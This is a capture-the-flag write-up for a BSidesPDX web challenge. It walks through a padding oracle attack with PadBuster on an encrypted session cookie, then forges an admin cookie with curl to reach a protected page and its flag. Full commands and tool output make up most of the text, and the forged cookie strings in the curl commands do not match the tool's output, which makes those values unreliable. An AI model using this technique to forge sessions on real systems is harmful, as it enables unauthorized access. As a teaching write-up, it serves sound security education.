# Web 200 Solution

##Solution

```
The great Oracle at Dodona welcomes you

What would you like to ask the Oracle? 
```

Some great Oracle...

Looking at the main page, there's a text box to input a question to ask the Oracle. Just about any input seems to reply with magic 8 ball type responses. 

It seems like this input box is not going to be useful. At this point, I run some enumeration and try to find any other valid pages. Interestingly, there is one page that returns a 403 Forbidden, the /admin page.

So it seems like this may be a page we want to get access to. There doesn't seem to be any sort of login, so what's controlling it? Taking a look at the request, there's an interesting cookie in there:
```
Cookie: session=e3759add-d75a-4773-8a60-d24048f9f42c; wisdom_of_the_gods=wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3
```

The wisdom_of_the_gods looks potentially interesting. Wait...oracle, cookie, could this be a padding oracle vulnerability?

There's a nice utility for exactly these types of vulnerabilities called [PadBuster](https://github.com/GDSSecurity/PadBuster). All we have to do is grab the cookie, point it at the url, and see what happens.

```
padbuster http://127.0.0.1 wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3 16 -cookies wisdom_of_the_gods=wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3
```

Which should give you an output of:
```
+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 907

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 8 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#	Freq	Status	Length	Location
-------------------------------------------------------
1	1	200	907	N/A
2 **	255	500	291	N/A
-------------------------------------------------------
```

Running it against ID#2 will go through the process of recovering the plaintext of the cookie. The resulting plaintext looks something like:
```
[+] Decrypted value (ASCII): {"username": "guest", "whats_the_answer_to_life_the_universe_and_everything": "", "security_put_some_text_here": ""}
```

Awesome, we can see that we're a guest. Maybe that's why we couldn't get to the admin page before. The nice thing about padbuster is it also allows you to set the plaintext you want to be recrypted and it will spit out the correct value for you to put into your cookie.

```
padbuster http://127.0.0.1 wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3 16 -cookies wisdom_of_the_gods=wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3 -plaintext '{"username": "admin", "whats_the_answer_to_life_the_universe_and_everything": "", "security_put_some_text_here": ""}'

...

[+] Encrypted value is: trl3KJHTndq28WG0XrnPj9B6593W%2BVlSiB20tsaKlqylGVHVFz2xvXxQH8oR7ni%2BfWnhGtmtk6k%2BSxWkWESgKFl5aFzpzzDBVp9QoLQgO2Wdeijseus33psx8iEK8YRTeQygBz69lRJPIkUcjiJZgaV2TYEWt%2FN4DUa0C3Fz4y0AAAAAAAAAAAAAAAAAAAAA

```

So let's use that new value, put it into our cookie, and see if we can hit the admin page:
```
curl -b 'wisdom_of_the_gods=trl3KJHTndq28WG0XrnPj9B6593W%2BVlSiB20tsaKlqylGVHVFz2xvXxQH8oR7ni%2BfWnhGtmtk6k%2BSxWkWESgKFl5aFzpzzDBVp9QoLQgO2Wde3psx8iEK8YRTeQygBz69lRJPIkUcjiJZgaV2TYEWt%2FN4DUa0C3Fz4y0AAAAAAAAAAAAAAAAAAAAA' http://127.0.0.1/admin

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don't have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>

```

Still no access...however, there were two other fields that were in the decoded cookie. Maybe we need to populate those too. The answer to life, the universe, and everything is obviously 42 and the other fields says to put some text here so let's do that:

```
padbuster http://127.0.0.1 wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3 16 -cookies wisdom_of_the_gods=wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3 -plaintext '{"username": "admin", "whats_the_answer_to_life_the_universe_and_everything": "42", "security_put_some_text_here": "trololol"}'

...

[+] Encrypted value is: dapH9HiqyGELErgHPMW9pP%2F1R94TJ4XPu8MSlcOnBkFu3eDzQqlIlfwp%2FzfYkthhi3D5QVxcuT77DhGckKsZqVAGjAJweoWZf9rsgO9rdDB87m5rvKYN05Wuc9f9Ovtggsrh5w74Rd7Yn2ZcJrCEB6duT95uyZAYbibXa18C7SMAAAAAAAAAAAAAAAAAAAAA
```

Ok, let's give this one a shot:

```
curl -b 'wisdom_of_the_gods=dapH9HiqyGELErgHPMW9pP%2F1R94TJ4XPu8MSlcOnBkFu3eDzQqlIlfwp%2FzfYkthhi3D5QVxcuT77DhGckKsZqVAGjAJweoWZf9rsgO9rdDB87m5Wuc9f9Ovtggsrh5w74Rd7Yn2ZcJrCEB6duT95uyZAYbibXa18C7SMAAAAAAAAAAAAAAAAAAAAA' http://127.0.0.1/admin

<!doctype html>
<head>
	<link rel="stylesheet" type="text/css" href="/static/styles/style.css" />
</head>
<body>
	<h1 align="center">Welcome Oracle!</h1>
	<br />
	<p align="center">Walking by the sacred oak tree, the bronze cauldrons begin to ring...almost as if saying</p>
	<br />
	<br />
	<p align="center"><i>BSidesPDX{Th3_D0d0ni4n_ch4tt3rb0x_pr3dic7s_Y0ur_v!ct0ry}</i></p>
</body>
```

And there is it, the flag!